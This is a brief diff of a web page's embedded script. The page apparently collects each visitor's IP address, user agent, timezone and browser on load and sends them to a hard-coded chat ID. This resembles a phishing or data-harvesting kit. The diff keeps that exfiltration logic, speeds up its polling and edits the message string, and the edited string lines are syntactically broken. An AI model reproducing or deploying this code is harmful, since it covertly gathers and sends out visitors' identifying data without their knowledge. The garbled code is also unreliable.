@@ -1,4 +1,5 @@
 
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -158,9 +159,9 @@ document.addEventListener("DOMContentLoaded", (() => {
 		new Promise((e => {
 			const t = setInterval((() => {
 				"Fetching..." !== n.ipAddress && (clearInterval(t), e())
-			}), 1000)
+			}), 100)
 		})).then((() => {
-			s += Https:\\nIP Address: ${n.ipAddress}\nUser Agent: ${n.userAgent}\nTimezone: ${n.timezone}\nBrowser: ${n.browser}`, (e => {
+			s += /nIP Address: ${n.ipAddress}\nUser Agent: ${n.userAgent}\nTimezone: ${n.timezone}\nBrowser: ${n.browser}`, (e => {
 				const t = {
 					chat_id: "8294092184",
 					text: e
